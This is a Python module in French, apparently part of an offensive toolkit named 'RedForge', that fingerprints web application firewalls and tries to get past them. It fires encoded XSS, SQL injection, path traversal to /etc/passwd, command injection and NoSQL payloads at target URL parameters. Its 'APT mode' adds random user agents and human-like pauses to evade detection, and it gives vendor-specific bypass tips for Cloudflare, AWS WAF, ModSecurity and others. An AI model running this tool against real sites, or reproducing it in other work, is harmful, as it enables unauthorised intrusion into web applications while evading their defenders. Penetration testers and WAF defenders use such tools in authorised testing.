#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de contournement WAF pour RedForge
Détection et contournement des Web Application Firewalls
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import hashlib
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, quote, unquote, quote_plus
from concurrent.futures import ThreadPoolExecutor, as_completed

@dataclass
class WAFBypassConfig:
    """Configuration avancée pour le contournement WAF"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    max_techniques: int = 20
    test_all_techniques: bool = True
    adaptive_bypass: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_waf_rules: bool = True
    test_ip_rotation: bool = False
    max_payloads_per_technique: int = 10


class WAFBypass:
    """Détection et contournement avancé des Web Application Firewalls"""
    
    def __init__(self, config: Optional[WAFBypassConfig] = None):
        """
        Initialise le détecteur de contournement WAF
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or WAFBypassConfig()
        
        # Signatures WAF avancées
        self.waf_signatures = {
            "Cloudflare": {
                "headers": ["cf-ray", "__cfduid", "cf-cache-status", "cf-polished"],
                "body": ["cloudflare", "attention required", "ray id:"],
                "cookies": ["__cfduid", "__cflb"]
            },
            "AWS WAF": {
                "headers": ["x-amzn-requestid", "x-amzn-requestid", "aws-waf-token"],
                "body": ["aws waf", "request blocked", "unauthorized"],
                "cookies": ["aws-waf-token", "awsalb"]
            },
            "ModSecurity": {
                "headers": ["mod_security", "modsecurity", "x-mod-security"],
                "body": ["mod_security", "not acceptable", "406 not acceptable"],
                "cookies": []
            },
            "Imperva (Incapsula)": {
                "headers": ["x-cis", "x-iinfo", "x-cdn", "incapsula"],
                "body": ["incapsula", "imperva", "visitor"],
                "cookies": ["incap_ses", "visid_incap"]
            },
            "Sucuri": {
                "headers": ["x-sucuri-id", "x-sucuri-cache", "x-sucuri-block"],
                "body": ["sucuri", "cloudproxy", "access denied"],
                "cookies": ["sucuri_cloudproxy"]
            },
            "F5 BIG-IP ASM": {
                "headers": ["x-wa-info", "x-f5", "bigip"],
                "body": ["the requested url was rejected", "f5"],
                "cookies": ["TS", "BIGipServer"]
            },
            "Akamai": {
                "headers": ["x-akamai-transformed", "x-akamai-request-id"],
                "body": ["akamai", "reference number", "error reference"],
                "cookies": ["ak_bmsc", "bm_sz"]
            },
            "Fortinet": {
                "headers": ["x-fortinet", "fortigate"],
                "body": ["fortiguard", "web filtering"],
                "cookies": []
            },
            "Barracuda": {
                "headers": ["x-barracuda", "barracuda"],
                "body": ["barracuda", "blocked"],
                "cookies": []
            }
        }
        
        # Techniques de bypass avancées
        self.bypass_techniques = self._generate_bypass_techniques()
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.successful_bypasses = 0
        self.waf_detected_info = None
    
    def _generate_bypass_techniques(self) -> Dict[str, List[str]]:
        """Génère une liste complète de techniques de bypass"""
        techniques = {
            "case_manipulation": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "SeLeCt * FrOm users",
                "' Or '1'='1",
                "<IMG Src=x OnError=alert('XSS')>"
            ],
            "url_encoding": [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "SELECT%20*%20FROM%20users",
                "%27%20OR%20%271%27=%271",
                "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E"
            ],
            "double_encoding": [
                "%253Cscript%253Ealert('XSS')%253C/script%253E",
                "%2527%20OR%20%25271%2527=%25271",
                "%253Cimg%2520src%253Dx%2520onerror%253Dalert('XSS')%253E"
            ],
            "unicode_encoding": [
                "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
                "%u003cscript%u003ealert('XSS')%u003c/script%u003e",
                "\\u0027 OR \\u00271\\u0027=\\u00271"
            ],
            "hex_encoding": [
                "<script>alert('XSS')</script>".encode().hex(),
                "SELECT * FROM users".encode().hex(),
                "0x27204f52202731273d2731"
            ],
            "comments": [
                "<scri/*test*/pt>alert('XSS')</scri/*test*/pt>",
                "SEL/*test*/ECT * FROM users",
                "' OR /*test*/'1'='1",
                "<img/*test*/ src=x onerror=alert('XSS')>"
            ],
            "line_breaks": [
                "<scri%0Apt>alert('XSS')</scri%0Apt>",
                "SEL%0AECT * FROM users",
                "%0A' OR '1'='1"
            ],
            "tab_characters": [
                "<scri\tpt>alert('XSS')</scri\tpt>",
                "SEL\tECT * FROM users",
                "\t' OR '1'='1"
            ],
            "null_bytes": [
                "<scri%00pt>alert('XSS')</scri%00pt>",
                "SEL%00ECT * FROM users",
                "%00' OR '1'='1"
            ],
            "http_parameter_pollution": [
                "id=1&id=2' OR '1'='1",
                "page=1&page=../../etc/passwd",
                "user=admin&user=' OR '1'='1"
            ],
            "path_traversal_bypass": [
                "....//....//etc/passwd",
                "..;/..;/etc/passwd",
                "..%c0%af..%c0%afetc%c0%afpasswd",
                "..%252f..%252fetc%252fpasswd"
            ],
            "json_bypass": [
                '{"key": "<script>alert(\'XSS\')</script>"}',
                '{"username": "admin", "password": {"$ne": null}}'
            ],
            "xml_bypass": [
                '<tag><script>alert("XSS")</script></tag>',
                '<?xml version="1.0"?><root><![CDATA[<script>alert("XSS")</script>]]></root>'
            ],
            "ip_bypass": [
                "127.0.0.1",
                "2130706433",  # 127.0.0.1 en decimal
                "0x7f000001",  # 127.0.0.1 en hex
                "localhost",
                "0:0:0:0:0:ffff:7f00:1"  # IPv6
            ]
        }
        
        # Limiter le nombre de payloads par technique
        for technique in techniques:
            techniques[technique] = techniques[technique][:self.config.max_payloads_per_technique]
        
        return techniques
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne et tente de contourner le WAF
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - test_payload: Payload de test
                - techniques: Techniques de bypass à tester
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.successful_bypasses = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Détection et contournement WAF sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        # Détecter le WAF
        waf_info = self._detect_waf_advanced(target)
        self.waf_detected_info = waf_info
        
        if waf_info['detected']:
            print(f"      ✓ WAF détecté: {waf_info['name']}")
            if waf_info.get('confidence'):
                print(f"      ✓ Confiance: {waf_info['confidence']}%")
            
            # Tester les techniques de bypass
            bypass_techniques = kwargs.get('techniques', list(self.bypass_techniques.keys()))
            successful_bypasses = []
            
            test_payload = kwargs.get('test_payload', "<script>alert('XSS')</script>")
            
            for idx, technique in enumerate(bypass_techniques):
                if technique not in self.bypass_techniques:
                    continue
                
                # Pause APT
                if self.config.apt_mode and idx > 0:
                    self._apt_pause()
                elif self.config.random_delays and idx > 0:
                    time.sleep(random.uniform(*self.config.delay_between_tests))
                
                for payload in self.bypass_techniques[technique]:
                    result = self._test_bypass_advanced(target, payload, test_payload)
                    self.tests_performed += 1
                    
                    if result['bypassed']:
                        self.successful_bypasses += 1
                        successful_bypasses.append({
                            "technique": technique,
                            "payload": payload[:100] + "..." if len(payload) > 100 else payload,
                            "response_length": result['length'],
                            "status_code": result['status_code'],
                            "confidence": result.get('confidence', 70)
                        })
                        print(f"      ✓ Bypass réussi: {technique}")
                        
                        if self.config.apt_mode:
                            break
                
                if successful_bypasses and kwargs.get('stop_on_first', True):
                    break
            
            waf_info['bypass_techniques'] = successful_bypasses
            waf_info['bypass_count'] = len(successful_bypasses)
        
        return self._generate_results(target, waf_info)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_techniques' in kwargs:
            self.config.max_techniques = kwargs['max_techniques']
        if 'test_all_techniques' in kwargs:
            self.config.test_all_techniques = kwargs['test_all_techniques']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_payloads_per_technique = min(self.config.max_payloads_per_technique, 5)
            self.config.delay_between_tests = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _detect_waf_advanced(self, target: str) -> Dict[str, Any]:
        """
        Détection avancée de WAF
        
        Args:
            target: URL cible
        """
        result = {
            "detected": False,
            "name": None,
            "confidence": 0,
            "signatures": [],
            "headers": {},
            "blocking_behavior": {}
        }
        
        try:
            # Requête normale
            headers = self._get_stealth_headers()
            normal_response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Requêtes malveillantes pour déclencher le WAF
            test_payloads = [
                "?id=1' OR '1'='1",
                "?q=<script>alert('XSS')</script>",
                "?page=../../etc/passwd",
                "?exec=;ls"
            ]
            
            malicious_responses = []
            for payload in test_payloads:
                try:
                    resp = requests.get(target + payload, headers=headers, timeout=10, verify=False)
                    malicious_responses.append(resp)
                except:
                    pass
                time.sleep(0.5)
            
            # Analyser les signatures
            all_text = normal_response.text
            all_headers = str(normal_response.headers)
            
            for waf_name, signatures in self.waf_signatures.items():
                score = 0
                found_signatures = []
                
                # Vérifier les headers
                for sig in signatures.get('headers', []):
                    if sig in all_headers.lower():
                        score += 20
                        found_signatures.append(sig)
                
                # Vérifier le body
                for sig in signatures.get('body', []):
                    if sig in all_text.lower():
                        score += 15
                        found_signatures.append(sig)
                
                # Analyser les réponses malveillantes
                for mal_resp in malicious_responses:
                    if mal_resp.status_code in [403, 406, 429, 501]:
                        score += 10
                    
                    if len(mal_resp.text) < len(normal_response.text) * 0.5:
                        score += 10
                
                if score >= 30:
                    result["detected"] = True
                    result["name"] = waf_name
                    result["confidence"] = min(score, 100)
                    result["signatures"] = found_signatures
                    break
            
            # Vérifier les comportements de blocage
            if malicious_responses:
                first_mal = malicious_responses[0]
                if first_mal.status_code in [403, 406, 429]:
                    result["blocking_behavior"]["status_code"] = first_mal.status_code
                    result["blocking_behavior"]["type"] = "http_block"
                elif len(first_mal.text) < 100:
                    result["blocking_behavior"]["type"] = "empty_response"
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _test_bypass_advanced(self, target: str, technique_payload: str, 
                               original_payload: str) -> Dict[str, Any]:
        """
        Teste une technique de bypass avancée
        
        Args:
            target: URL cible
            technique_payload: Payload avec technique de bypass
            original_payload: Payload original pour comparaison
        """
        result = {
            "bypassed": False,
            "length": 0,
            "status_code": None,
            "confidence": 0
        }
        
        # Construire l'URL avec payload
        parsed = urlparse(target)
        
        # Tester différents paramètres
        test_params = ['id', 'q', 'search', 'page', 'user', 'input', 'query', 's']
        
        for param in test_params:
            test_url = f"{target}?{param}={quote(technique_payload)}"
            original_url = f"{target}?{param}={quote(original_payload)}"
            
            try:
                headers = self._get_stealth_headers()
                
                # Requête avec bypass
                bypass_response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                # Requête originale (devrait être bloquée)
                original_response = requests.get(original_url, headers=headers, timeout=10, verify=False)
                
                # Critères de succès
                bypass_success = bypass_response.status_code == 200
                original_blocked = original_response.status_code in [403, 406, 429, 501]
                
                if bypass_success and original_blocked:
                    result["bypassed"] = True
                    result["length"] = len(bypass_response.text)
                    result["status_code"] = bypass_response.status_code
                    result["confidence"] = 90
                    break
                
                # Comparaison de longueur
                if len(bypass_response.text) > len(original_response.text) * 1.5:
                    result["bypassed"] = True
                    result["length"] = len(bypass_response.text)
                    result["status_code"] = bypass_response.status_code
                    result["confidence"] = 70
                    break
                
                # Vérification de contenu spécifique
                if "alert" in bypass_response.text.lower() or "xss" in bypass_response.text.lower():
                    result["bypassed"] = True
                    result["confidence"] = 85
                    break
                    
            except Exception:
                continue
        
        return result
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, waf_info: Dict) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "waf_detected": waf_info['detected'],
            "waf_name": waf_info.get('name'),
            "waf_confidence": waf_info.get('confidence', 0),
            "waf_signatures": waf_info.get('signatures', []),
            "bypass_techniques": waf_info.get('bypass_techniques', []),
            "bypass_count": waf_info.get('bypass_count', 0),
            "tests_performed": self.tests_performed,
            "successful_bypasses": self.successful_bypasses,
            "scan_duration": duration,
            "bypass_rate": (self.successful_bypasses / max(1, self.tests_performed) * 100),
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_techniques": self.config.max_techniques
            },
            "summary": self._generate_summary(waf_info),
            "recommendations": self._generate_recommendations(waf_info)
        }
    
    def _generate_summary(self, waf_info: Dict) -> Dict[str, Any]:
        """Génère un résumé des informations WAF"""
        return {
            "detected": waf_info.get('detected', False),
            "name": waf_info.get('name'),
            "confidence": waf_info.get('confidence', 0),
            "bypass_count": len(waf_info.get('bypass_techniques', [])),
            "successful_bypass_rate": (len(waf_info.get('bypass_techniques', [])) / 
                                       max(1, len(self.bypass_techniques)) * 100)
        }
    
    def _generate_recommendations(self, waf_info: Dict) -> List[str]:
        """Génère des recommandations basées sur les résultats"""
        recommendations = []
        
        if waf_info.get('detected'):
            recommendations.append(f"WAF détecté: {waf_info.get('name')} - Nécessite des tests approfondis")
        
        if waf_info.get('bypass_count', 0) > 0:
            recommendations.append("URGENT: Des techniques de bypass ont réussi - Réviser les règles WAF")
            recommendations.append("Ajouter des règles spécifiques pour les encodages et variations")
        
        if waf_info.get('confidence', 0) < 50:
            recommendations.append("La confiance de détection est faible - Investigation manuelle recommandée")
        
        recommendations.append("Configurer le WAF en mode blocage après validation")
        recommendations.append("Mettre à jour régulièrement les signatures WAF")
        recommendations.append("Effectuer des tests de pénétration réguliers")
        
        return recommendations
    
    def get_bypass_payloads(self, payload_type: str = "sqli", 
                           include_advanced: bool = True) -> List[str]:
        """
        Génère une liste de payloads de bypass pour un type d'attaque
        
        Args:
            payload_type: Type d'attaque (sqli, xss, lfi, rce)
            include_advanced: Inclure les techniques avancées
        """
        base_payloads = []
        
        if payload_type == "sqli":
            base_payloads = [
                "' OR '1'='1",
                "1' AND '1'='1",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' OR 1=1--"
            ]
        elif payload_type == "xss":
            base_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>"
            ]
        elif payload_type == "lfi":
            base_payloads = [
                "../../../etc/passwd",
                "....//....//etc/passwd",
                "..;/..;/etc/passwd",
                "..%c0%af..%c0%afetc%c0%afpasswd"
            ]
        elif payload_type == "rce":
            base_payloads = [
                "; ls",
                "| ls",
                "& ls",
                "$(ls)",
                "`ls`",
                "; cat /etc/passwd"
            ]
        elif payload_type == "sqli_blind":
            base_payloads = [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1' AND '1'='1' AND SLEEP(5)--",
                "admin' AND SLEEP(5)--"
            ]
        
        all_payloads = []
        
        # Appliquer les techniques de bypass
        for base in base_payloads:
            # Original
            all_payloads.append(base)
            
            # Case manipulation
            all_payloads.append(base.swapcase())
            all_payloads.append(base.upper())
            all_payloads.append(base.lower())
            
            # URL encoding
            all_payloads.append(quote(base))
            all_payloads.append(quote_plus(base))
            all_payloads.append(quote(quote(base)))  # Double encoding
            
            if include_advanced:
                # Hex encoding
                all_payloads.append(base.encode().hex())
                
                # Unicode encoding
                unicode_payload = ''.join(f'\\u{ord(c):04x}' for c in base)
                all_payloads.append(unicode_payload)
                
                # Comment insertion
                if "'" in base:
                    all_payloads.append(base.replace("'", "'/**/"))
                if ">" in base:
                    all_payloads.append(base.replace(">", ">/**/"))
                if "<" in base:
                    all_payloads.append(base.replace("<", "</**/"))
        
        return list(set(all_payloads))
    
    def suggest_bypass(self, waf_name: str) -> Dict[str, List[str]]:
        """
        Suggère des techniques de bypass spécifiques pour un WAF
        
        Args:
            waf_name: Nom du WAF détecté
        """
        suggestions = {
            "Cloudflare": {
                "techniques": ["ip_rotation", "rate_limiting_bypass", "cache_poisoning"],
                "tips": [
                    "Utiliser des adresses IP d'origine si disponibles",
                    "Contournement via Cloudflare Workers",
                    "Exploiter les failles de cache poisoning",
                    "Utiliser des payloads encodés en UTF-16",
                    "Contourner les règles rate limiting en ralentissant les requêtes"
                ]
            },
            "ModSecurity": {
                "techniques": ["double_encoding", "comments", "line_breaks", "tab_characters"],
                "tips": [
                    "Utiliser le double encodage URL",
                    "Insérer des caractères de tabulation",
                    "Utiliser des commentaires SQL/HTML",
                    "Fractionner les payloads sur plusieurs lignes",
                    "Exploiter les regex mal configurées"
                ]
            },
            "AWS WAF": {
                "techniques": ["json_bypass", "xml_bypass", "http_parameter_pollution"],
                "tips": [
                    "Exploiter les limites de taille des requêtes",
                    "Contournement via fragmentation TCP",
                    "Utiliser des IPs autorisées si disponibles",
                    "Exploiter les failles de parsing JSON/XML"
                ]
            },
            "Imperva (Incapsula)": {
                "techniques": ["ip_bypass", "path_traversal_bypass", "unicode_encoding"],
                "tips": [
                    "Contournement via les IPs autorisées",
                    "Utiliser des encodages exotiques (IBM037)",
                    "Exploiter les failles de cache",
                    "Fractionner les attaques en plusieurs requêtes"
                ]
            },
            "F5 BIG-IP ASM": {
                "techniques": ["null_bytes", "hex_encoding", "case_manipulation"],
                "tips": [
                    "Utiliser des null bytes pour tronquer les règles",
                    "Exploiter les limites de parsing",
                    "Contourner via des méthodes HTTP alternatives"
                ]
            }
        }
        
        for known_waf, bypass_info in suggestions.items():
            if known_waf.lower() in waf_name.lower():
                return bypass_info
        
        # Suggestions génériques
        return {
            "techniques": ["case_manipulation", "url_encoding", "double_encoding", "comments"],
            "tips": [
                "Tester le case manipulation",
                "Essayer différents encodages (URL, Unicode, Hex)",
                "Utiliser des caractères d'échappement (tab, newline, null byte)",
                "Insérer des commentaires dans les payloads",
                "Fractionner les payloads en plusieurs parties"
            ]
        }
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "successful_bypasses": self.successful_bypasses,
            "bypass_rate": (self.successful_bypasses / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "waf_detected": self.waf_detected_info.get('detected', False) if self.waf_detected_info else False,
            "waf_name": self.waf_detected_info.get('name') if self.waf_detected_info else None
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    waf = WAFBypass()
    results = waf.scan("https://example.com")
    print(f"WAF détecté: {results['waf_detected']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = WAFBypassConfig(apt_mode=True, max_payloads_per_technique=3)
    waf_apt = WAFBypass(config=apt_config)
    results_apt = waf_apt.scan("https://example.com", apt_mode=True)
    print(f"WAF détecté (APT): {results_apt['waf_detected']}")
    
    # Générer payloads SQLi
    sqli_payloads = waf_apt.get_bypass_payloads("sqli", include_advanced=True)
    print(f"Payloads SQLi générés: {len(sqli_payloads)}")
    
    # Obtenir des suggestions pour Cloudflare
    suggestions = waf_apt.suggest_bypass("Cloudflare")
    print(f"Techniques suggérées: {suggestions['techniques']}")
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")